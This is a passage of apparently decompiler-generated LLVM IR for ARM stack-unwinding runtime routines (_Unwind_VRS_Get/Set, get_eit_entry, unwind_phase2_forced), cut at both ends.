  uselistorder i16* @global_var_24150.533, { 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 68, 74, 73, 67, 66, 34, 33, 71, 72, 70, 69, 81, 80, 79, 78, 77, 76, 75, 30, 29, 40, 28, 65, 50, 49, 12, 6, 5, 11, 27, 26, 10, 3, 2, 14, 9, 8, 7, 39, 32, 13, 54, 53, 38, 23, 25, 24, 62, 61, 22, 21, 37, 20, 36, 19, 52, 18, 35, 17, 41, 60, 16, 64, 63, 48, 45, 44, 43, 51, 4, 59, 15, 42, 58, 31, 57, 56, 55, 0, 1, 47, 46 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_19e3c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19e4c = icmp eq i32 %regclass, 0
  br i1 %v2_19e4c, label %dec_label_pc_19e54, label %dec_label_pc_19e84

dec_label_pc_19e54:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19e54
  %v6_19e58 = icmp eq i32 %representation, 0
  br i1 %v6_19e58, label %dec_label_pc_19e68, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19e54
  br label %dec_label_pc_19e90

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19e90

dec_label_pc_19e68:                               ; preds = %bb
  %v3_19e68 = mul i32 %regno, 4
  %v2_19e6c = add i32 %v3_19e68, %context
  %v1_19e70 = add i32 %v2_19e6c, 4
  %v2_19e70 = inttoptr i32 %v1_19e70 to i32*
  %v3_19e70 = load i32, i32* %v2_19e70, align 4
  %v2_19e7c = bitcast i8* %valuep to i32*
  store i32 %v3_19e70, i32* %v2_19e7c, align 4
  ret i32 0

dec_label_pc_19e84:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19e84
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19e84, %bb9
  %v0_19e8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19e8c)
  br label %dec_label_pc_19e90

dec_label_pc_19e90:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19e90, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19e98 = icmp eq i32 %regclass, 0
  br i1 %v2_19e98, label %dec_label_pc_19ea0, label %dec_label_pc_19ed0

dec_label_pc_19ea0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19ea0
  %v6_19ea4 = icmp eq i32 %representation, 0
  br i1 %v6_19ea4, label %dec_label_pc_19eb4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19ea0
  br label %dec_label_pc_19edc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19edc

dec_label_pc_19eb4:                               ; preds = %bb
  %v3_19eb8 = mul i32 %regno, 4
  %v1_19ebc = bitcast i8* %valuep to i32*
  %v2_19ebc = load i32, i32* %v1_19ebc, align 4
  %v2_19ec0 = add i32 %v3_19eb8, %context
  %v2_19ec8 = add i32 %v2_19ec0, 4
  %v3_19ec8 = inttoptr i32 %v2_19ec8 to i32*
  store i32 %v2_19ebc, i32* %v3_19ec8, align 4
  ret i32 0

dec_label_pc_19ed0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19ed0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19ed0, %bb9
  %v0_19ed8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19ed8)
  br label %dec_label_pc_19edc

dec_label_pc_19edc:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19edc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_19ee4 = add i32 %context, 68
  %v2_19ee4 = inttoptr i32 %v1_19ee4 to i32*
  %v3_19ee4 = load i32, i32* %v2_19ee4, align 4
  ret i32 %v3_19ee4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_19ef4 = add i32 %exc, 8
  %v2_19ef4 = inttoptr i32 %v1_19ef4 to i32*
  %v3_19ef4 = load i32, i32* %v2_19ef4, align 4
  %v2_19ef8 = icmp eq i32 %v3_19ef4, 0
  br i1 %v2_19ef8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_19f0c = xor i1 %v2_19ef8, true
  call void @__pseudo_cond_branch(i1 %v2_19f0c, i32 %v3_19ef4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19f24 = call i32 @abort()
  ret i32 %v0_19f24
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19f30 = call i32 @abort()
  ret i32 %v0_19f30
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19f34 = load i32, i32* @r4, align 4
  store i32 %v3_19f34, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r5.global-to-local, align 4
  %v4_19f44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 132) to i32*), align 4
  %v2_19f48 = icmp eq i32 %v4_19f44, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_19f54 = add i32 %return_address, -2
  store i32 %v1_19f54, i32* %r4.global-to-local, align 4
  br i1 %v2_19f48, label %dec_label_pc_19f8c, label %dec_label_pc_19f5c

dec_label_pc_19f5c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_19f44)
  %v2_19f6c = icmp eq i32 %v1_19f54, 0
  br i1 %v2_19f6c, label %.thread, label %dec_label_pc_19facthread-pre-split

.thread:                                          ; preds = %dec_label_pc_19f5c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_19f74 = load i32, i32* %r6.global-to-local, align 4
  %v3_19f74 = add i32 %v2_19f74, 16
  %v4_19f74 = inttoptr i32 %v3_19f74 to i32*
  store i32 0, i32* %v4_19f74, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_19f7c:                               ; preds = %.thread, %.thread10, %dec_label_pc_1a124, %dec_label_pc_1a110, %dec_label_pc_1a0ec, %dec_label_pc_1a0c4, %dec_label_pc_19fc4
  %v0_19f7c = load i32, i32* %r2.global-to-local, align 4
  %v2_19f84 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_19f84, i32* @r4, align 4
  ret i32 %v0_19f7c

dec_label_pc_19f8c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_19f94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 20) to i32*), align 4
  %v4_19f98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 48) to i32*), align 4
  store i32 %v4_19f98, i32* %r2.global-to-local, align 4
  %v2_19f9c = sub i32 %v4_19f94, %v4_19f98
  %v3_19fa0 = sdiv i32 %v2_19f9c, 8
  store i32 %v3_19fa0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_19fac

dec_label_pc_19facthread-pre-split:               ; preds = %dec_label_pc_19f5c
  %v3_19fac.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_19fac

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19facthread-pre-split, %dec_label_pc_19f8c
  %v0_19ff0.pre = phi i32 [ %v1_19f54, %dec_label_pc_19facthread-pre-split ], [ %v4_19f98, %dec_label_pc_19f8c ]
  %v1_19fb4 = phi i32 [ %v3_19fac.pr, %dec_label_pc_19facthread-pre-split ], [ %v3_19fa0, %dec_label_pc_19f8c ]
  %v2_19fb0 = icmp eq i32 %v1_19fb4, 0
  br i1 %v2_19fb0, label %dec_label_pc_19fc4, label %dec_label_pc_19fe0.preheader

dec_label_pc_19fe0.preheader:                     ; preds = %dec_label_pc_19fac
  %v2_19fb4 = add i32 %v1_19fb4, -1
  %v1_1a010 = add i32 %v0_19ff0.pre, 8
  br label %dec_label_pc_19fe0.outer

dec_label_pc_19fc4.loopexit:                      ; preds = %dec_label_pc_1a03c
  br label %dec_label_pc_19fc4

dec_label_pc_19fc4:                               ; preds = %dec_label_pc_19fc4.loopexit, %dec_label_pc_19fac, %dec_label_pc_1a108
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_19fcc = load i32, i32* %r6.global-to-local, align 4
  %v2_19fcc = add i32 %v1_19fcc, 16
  %v3_19fcc = inttoptr i32 %v2_19fcc to i32*
  store i32 0, i32* %v3_19fcc, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_19fd4:                               ; preds = %dec_label_pc_1a030
  %v3_19fd4 = icmp ult i32 %storemerge40, %v0_1a034
  br i1 %v3_19fd4, label %dec_label_pc_19fdc, label %dec_label_pc_1a04c

dec_label_pc_19fdc:                               ; preds = %dec_label_pc_19fd4
  %v1_19fdc = add nsw i32 %v3_19fe8, 1
  br label %dec_label_pc_19fe0.outer

dec_label_pc_19fe0.outer:                         ; preds = %dec_label_pc_19fdc, %dec_label_pc_19fe0.preheader
  %v1_1a03c.ph = phi i32 [ %v1_19fdc, %dec_label_pc_19fdc ], [ 0, %dec_label_pc_19fe0.preheader ]
  %v0_19fe0.ph = phi i32 [ %v0_19fe0, %dec_label_pc_19fdc ], [ %v2_19fb4, %dec_label_pc_19fe0.preheader ]
  br label %dec_label_pc_19fe0

dec_label_pc_19fe0:                               ; preds = %dec_label_pc_19fe0.outer, %dec_label_pc_1a044
  %v0_19fe0 = phi i32 [ %v1_1a044, %dec_label_pc_1a044 ], [ %v0_19fe0.ph, %dec_label_pc_19fe0.outer ]
  %v2_19fe0 = add i32 %v0_19fe0, %v1_1a03c.ph
  %tmp = icmp slt i32 %v2_19fe0, 0
  %v4_19fe4 = zext i1 %tmp to i32
  %v5_19fe4 = add i32 %v4_19fe4, %v2_19fe0
  %v3_19fe8 = sdiv i32 %v5_19fe4, 2
  %v3_19fec = mul i32 %v3_19fe8, 8
  store i32 %v3_19fec, i32* @ip, align 4
  %v2_19ff0 = add i32 %v3_19fec, %v0_19ff0.pre
  %v3_19ff0 = inttoptr i32 %v2_19ff0 to i32*
  %v4_19ff0 = load i32, i32* %v3_19ff0, align 4
  %v1_19ff4 = and i32 %v4_19ff0, 1073741824
  %v2_19ff4 = icmp eq i32 %v1_19ff4, 0
  %v2_19ff8 = or i32 %v4_19ff0, -2147483648
  %tmp79 = bitcast i32 %v4_19ff0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_19ffc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_19ff4, i32 %v2_19ffc, i32 %v2_19ff8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_1a000 = icmp eq i32 %v2_19fb4, %v3_19fe8
  store i32 %v2_19ff0, i32* %r7.global-to-local, align 4
  br i1 %v9_1a000, label %dec_label_pc_1a030, label %dec_label_pc_1a010

dec_label_pc_1a010:                               ; preds = %dec_label_pc_19fe0
  %v2_1a014 = add i32 %v3_19fec, %v1_1a010
  %v3_1a014 = inttoptr i32 %v2_1a014 to i32*
  %v4_1a014 = load i32, i32* %v3_1a014, align 4
  %v1_1a01c = and i32 %v4_1a014, 1073741824
  %v2_1a01c = icmp eq i32 %v1_1a01c, 0
  %v2_1a020 = or i32 %v4_1a014, -2147483648
  %tmp81 = bitcast i32 %v4_1a014 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_1a024 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_1a01c, i32 %v2_1a024, i32 %v2_1a020
  %v1_1a028 = add i32 %v2_1a014, -1
  %v2_1a02c = add i32 %storemerge39, %v1_1a028
  br label %dec_label_pc_1a030

dec_label_pc_1a030:                               ; preds = %dec_label_pc_19fe0, %dec_label_pc_1a010
  %storemerge40 = phi i32 [ %v2_1a02c, %dec_label_pc_1a010 ], [ -1, %dec_label_pc_19fe0 ]
  %v2_1a030 = add i32 %storemerge, %v2_19ff0
  %v0_1a034 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a034 = icmp ult i32 %v0_1a034, %v2_1a030
  br i1 %v3_1a034, label %dec_label_pc_1a03c, label %dec_label_pc_19fd4

dec_label_pc_1a03c:                               ; preds = %dec_label_pc_1a030
  %v9_1a03c = icmp eq i32 %v3_19fe8, %v1_1a03c.ph
  br i1 %v9_1a03c, label %dec_label_pc_19fc4.loopexit, label %dec_label_pc_1a044

dec_label_pc_1a044:                               ; preds = %dec_label_pc_1a03c
  %v1_1a044 = add nsw i32 %v3_19fe8, -1
  br label %dec_label_pc_19fe0

dec_label_pc_1a04c:                               ; preds = %dec_label_pc_19fd4
  %v2_1a04c = load i32, i32* %v3_19ff0, align 4
  %v1_1a050 = and i32 %v2_1a04c, 1073741824
  %v2_1a050 = icmp eq i32 %v1_1a050, 0
  %v2_1a054 = or i32 %v2_1a04c, -2147483648
  %tmp83 = bitcast i32 %v2_1a04c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_1a058 = bitcast float %tmp84 to i32
  %v0_1a05c = select i1 %v2_1a050, i32 %v2_1a058, i32 %v2_1a054
  %v2_1a05c = add i32 %v0_1a05c, %v2_19ff0
  %v1_1a060 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a060 = add i32 %v1_1a060, 72
  %v3_1a060 = inttoptr i32 %v2_1a060 to i32*
  store i32 %v2_1a05c, i32* %v3_1a060, align 4
  %v0_1a064 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a064 = add i32 %v0_1a064, 4
  %v2_1a064 = inttoptr i32 %v1_1a064 to i32*
  %v3_1a064 = load i32, i32* %v2_1a064, align 4
  %v7_1a068 = icmp eq i32 %v3_1a064, 1
  br i1 %v7_1a068, label %.thread10, label %dec_label_pc_1a07c

.thread10:                                        ; preds = %dec_label_pc_1a04c
  %v1_1a068 = add i32 %v3_1a064, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_1a074 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a074 = add i32 %v2_1a074, 16
  %v4_1a074 = inttoptr i32 %v3_1a074 to i32*
  store i32 %v1_1a068, i32* %v4_1a074, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_1a07c:                               ; preds = %dec_label_pc_1a04c
  %v1_1a07c = icmp slt i32 %v3_1a064, 0
  br i1 %v1_1a07c, label %.thread38, label %dec_label_pc_1a094

.thread38:                                        ; preds = %dec_label_pc_1a07c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1a088 = load i32, i32* %r6.global-to-local, align 4
  %v5_1a088 = add i32 %v4_1a088, 76
  %v6_1a088 = inttoptr i32 %v5_1a088 to i32*
  store i32 %v1_1a064, i32* %v6_1a088, align 4
  %v3_1a08c = load i32, i32* %r2.global-to-local, align 4
  %v4_1a08c = load i32, i32* %r6.global-to-local, align 4
  %v5_1a08c = add i32 %v4_1a08c, 80
  %v6_1a08c = inttoptr i32 %v5_1a08c to i32*
  store i32 %v3_1a08c, i32* %v6_1a08c, align 4
  br label %dec_label_pc_1a0b4

dec_label_pc_1a094:                               ; preds = %dec_label_pc_1a07c
  %v1_1a094 = and i32 %v3_1a064, 1073741824
  %v2_1a094 = icmp eq i32 %v1_1a094, 0
  %v2_1a098 = or i32 %v3_1a064, -2147483648
  %tmp85 = bitcast i32 %v3_1a064 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1a09c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_1a094, i32 %v2_1a09c, i32 %v2_1a098
  %v1_1a0a0 = add i32 %storemerge42, 4
  %v2_1a0a4 = add i32 %v1_1a0a0, %v0_1a064
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1a0ac = load i32, i32* %r6.global-to-local, align 4
  %v2_1a0ac = add i32 %v1_1a0ac, 76
  %v3_1a0ac = inttoptr i32 %v2_1a0ac to i32*
  store i32 %v2_1a0a4, i32* %v3_1a0ac, align 4
  %v0_1a0b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a0b0 = add i32 %v1_1a0b0, 80
  %v3_1a0b0 = inttoptr i32 %v2_1a0b0 to i32*
  store i32 %v0_1a0b0, i32* %v3_1a0b0, align 4
  br label %dec_label_pc_1a0b4

dec_label_pc_1a0b4:                               ; preds = %.thread38, %dec_label_pc_1a094
  %v0_1a0b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a0b4 = add i32 %v0_1a0b4, 76
  %v2_1a0b4 = inttoptr i32 %v1_1a0b4 to i32*
  %v3_1a0b4 = load i32, i32* %v2_1a0b4, align 4
  store i32 %v3_1a0b4, i32* %r2.global-to-local, align 4
  %v1_1a0b8 = inttoptr i32 %v3_1a0b4 to i32*
  %v2_1a0b8 = load i32, i32* %v1_1a0b8, align 4
  %v1_1a0bc = icmp slt i32 %v2_1a0b8, 0
  br i1 %v1_1a0bc, label %dec_label_pc_1a0e0, label %dec_label_pc_1a0c4

dec_label_pc_1a0c4:                               ; preds = %dec_label_pc_1a0b4
  %v1_1a0c4 = and i32 %v2_1a0b8, 1073741824
  %v2_1a0c4 = icmp eq i32 %v1_1a0c4, 0
  %v2_1a0c8 = or i32 %v2_1a0b8, -2147483648
  %tmp87 = bitcast i32 %v2_1a0b8 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1a0cc = bitcast float %tmp88 to i32
  %v0_1a0d0 = select i1 %v2_1a0c4, i32 %v2_1a0cc, i32 %v2_1a0c8
  %v2_1a0d0 = add i32 %v0_1a0d0, %v3_1a0b4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1a0d8 = add i32 %v0_1a0b4, 16
  %v3_1a0d8 = inttoptr i32 %v2_1a0d8 to i32*
  store i32 %v2_1a0d0, i32* %v3_1a0d8, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_1a0e0:                               ; preds = %dec_label_pc_1a0b4
  %v3_1a0e0 = udiv i32 %v2_1a0b8, 16777216
  %v1_1a0e4 = urem i32 %v3_1a0e0, 16
  %v2_1a0e4 = icmp eq i32 %v1_1a0e4, 0
  br i1 %v2_1a0e4, label %dec_label_pc_1a0ec, label %dec_label_pc_1a100

dec_label_pc_1a0ec:                               ; preds = %dec_label_pc_1a0e0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a0f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a0f4 = add i32 %v0_1a0f4, -38392
  %v2_1a0f8 = add i32 %v0_1a0b4, 16
  %v3_1a0f8 = inttoptr i32 %v2_1a0f8 to i32*
  store i32 %v2_1a0f4, i32* %v3_1a0f8, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_1a100:                               ; preds = %dec_label_pc_1a0e0
  %v7_1a100 = icmp eq i32 %v1_1a0e4, 1
  br i1 %v7_1a100, label %dec_label_pc_1a124, label %dec_label_pc_1a108

dec_label_pc_1a108:                               ; preds = %dec_label_pc_1a100
  %v7_1a108 = icmp eq i32 %v1_1a0e4, 2
  br i1 %v7_1a108, label %dec_label_pc_1a110, label %dec_label_pc_19fc4

dec_label_pc_1a110:                               ; preds = %dec_label_pc_1a108
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a118 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a118 = add i32 %v0_1a118, -38408
  %v2_1a11c = add i32 %v0_1a0b4, 16
  %v3_1a11c = inttoptr i32 %v2_1a11c to i32*
  store i32 %v2_1a118, i32* %v3_1a11c, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_1a124:                               ; preds = %dec_label_pc_1a100
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a12c = load i32, i32* %r5.global-to-local, align 4
  %v2_1a12c = add i32 %v0_1a12c, -38400
  %v2_1a130 = add i32 %v0_1a0b4, 16
  %v3_1a130 = inttoptr i32 %v2_1a130 to i32*
  store i32 %v2_1a12c, i32* %v3_1a130, align 4
  br label %dec_label_pc_19f7c

; uselistorder directives
  uselistorder i32 %v1_1a0e4, { 2, 1, 0 }
  uselistorder i32 %v0_1a0b4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_1a064, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_1a034, { 1, 0 }
  uselistorder i32 %v3_19fec, { 2, 1, 0 }
  uselistorder i32 %v3_19fe8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_19fe0, { 1, 0 }
  uselistorder i32 %v0_19fe0, { 1, 0 }
  uselistorder i32 %v2_19fb4, { 1, 0 }
  uselistorder i32 %v0_19ff0.pre, { 1, 0 }
  uselistorder i32 %v3_19fa0, { 1, 0 }
  uselistorder i32 %v1_19f54, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1a0b4, { 1, 0 }
  uselistorder label %dec_label_pc_1a030, { 1, 0 }
  uselistorder label %dec_label_pc_19fe0, { 1, 0 }
  uselistorder label %dec_label_pc_19fc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19f7c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1a13c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a13c:
  %v0_1a13c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a13c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1a13c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a13c, %bb
  %v10_1a144 = phi i32 [ %arg1, %dec_label_pc_1a13c ], [ 0, %bb ]
  ret i32 %v10_1a144

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_1a158 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1a16c = inttoptr i32 %v1_1a158 to i32*
  %v2_1a16c = load i32, i32* %v1_1a16c, align 4
  store i32 %v2_1a16c, i32* %r0.global-to-local, align 4
  %v12_1a16c = add i32 %entry_vrs, 20
  %v1_1a178 = inttoptr i32 %v12_1a16c to i32*
  %v2_1a178 = load i32, i32* %v1_1a178, align 4
  store i32 %v2_1a178, i32* %r0.global-to-local, align 4
  %v12_1a178 = add i32 %entry_vrs, 36
  %v1_1a180 = inttoptr i32 %v12_1a178 to i32*
  %v2_1a180 = load i32, i32* %v1_1a180, align 4
  store i32 %v2_1a180, i32* %r0.global-to-local, align 4
  %v12_1a180 = add i32 %entry_vrs, 52
  store i32 %v12_1a180, i32* @ip, align 4
  %v13_1a184 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_1a184, i32* @lr, align 4
  %v1_1a188 = inttoptr i32 %v12_1a180 to i32*
  %v2_1a188 = load i32, i32* %v1_1a188, align 4
  store i32 %v2_1a188, i32* %r0.global-to-local, align 4
  %v9_1a188 = add i32 %entry_vrs, 64
  %v10_1a188 = inttoptr i32 %v9_1a188 to i32*
  %v11_1a188 = load i32, i32* %v10_1a188, align 4
  store i32 0, i32* @r4, align 4
  %v1_1a190 = add i32 %ucbp, 12
  %v2_1a190 = inttoptr i32 %v1_1a190 to i32*
  %v3_1a190 = load i32, i32* %v2_1a190, align 4
  store i32 %v2_1a188, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_1a1a8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_1a188)
  store i32 %v2_1a1a8, i32* %r0.global-to-local, align 4
  %v0_1a1ac = load i32, i32* @r6, align 4
  %v1_1a1ac = load i32, i32* @r4, align 4
  %v9_1a1ac = icmp eq i32 %v0_1a1ac, %v1_1a1ac
  store i32 %v2_1a1a8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1a1ac, label %dec_label_pc_1a1c0, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1a1cc

dec_label_pc_1a1c0:                               ; preds = %entry
  store i32 %v0_1a1ac, i32* @r4, align 4
  br label %dec_label_pc_1a1c8

dec_label_pc_1a1c8:                               ; preds = %dec_label_pc_1a290, %dec_label_pc_1a1c0
  br label %dec_label_pc_1a1cc

dec_label_pc_1a1cc:                               ; preds = %.thread, %dec_label_pc_1a1c8
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_1a1c8 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1a1cc = icmp eq i32 %v2_1a1a8, 0
  br i1 %v2_1a1cc, label %dec_label_pc_1a244, label %.thread2.dec_label_pc_1a1e0_crit_edge

.thread2.dec_label_pc_1a1e0_crit_edge:            ; preds = %dec_label_pc_1a1cc
  br label %dec_label_pc_1a1e0

dec_label_pc_1a1e0:                               ; preds = %.thread2.dec_label_pc_1a1e0_crit_edge, %dec_label_pc_1a244
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1a1f0 = load i32, i32* @r5, align 4
  store i32 %v0_1a1f0, i32* @r3, align 4
  store i32 107008, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_1a190)
  br i1 false, label %dec_label_pc_1a208, label %dec_label_pc_1a230

dec_label_pc_1a208:                               ; preds = %dec_label_pc_1a1e0
  br i1 undef, label %dec_label_pc_1a210, label %dec_label_pc_1a234

dec_label_pc_1a210:                               ; preds = %dec_label_pc_1a208
  br i1 undef, label %dec_label_pc_1a290, label %dec_label_pc_1a228

dec_label_pc_1a228:                               ; preds = %dec_label_pc_1a210
  br i1 undef, label %dec_label_pc_1a288, label %dec_label_pc_1a230

dec_label_pc_1a230:                               ; preds = %dec_label_pc_1a1e0, %dec_label_pc_1a228
  br label %dec_label_pc_1a234

dec_label_pc_1a234:                               ; preds = %dec_label_pc_1a208, %dec_label_pc_1a230
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_1a244:                               ; preds = %dec_label_pc_1a1cc
  store i32 %v11_1a188, i32* @r3, align 4
  %v2_1a248 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_1a248, i32* @r4, align 4
  %v1_1a24c = load i32, i32* @r5, align 4
  %v2_1a24c = add i32 %v1_1a24c, 20
  %v3_1a24c = inttoptr i32 %v2_1a24c to i32*
  store i32 %v11_1a188, i32* %v3_1a24c, align 4
  store i32 %v2_1a248, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1a25c = call i32 @memcpy()
  %v0_1a264 = load i32, i32* @r6, align 4
  store i32 %v0_1a264, i32* %r0.global-to-local, align 4
  %v0_1a268 = load i32, i32* @r5, align 4
  %v1_1a26c = add i32 %v0_1a268, 16
  %v2_1a26c = inttoptr i32 %v1_1a26c to i32*
  %v3_1a26c = load i32, i32* %v2_1a26c, align 4
  store i32 %v3_1a26c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1a26c)
  %v0_1a27c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a27c, i32* @r4, align 4
  br label %dec_label_pc_1a1e0

dec_label_pc_1a288:                               ; preds = %dec_label_pc_1a228
  br label %dec_label_pc_1a290

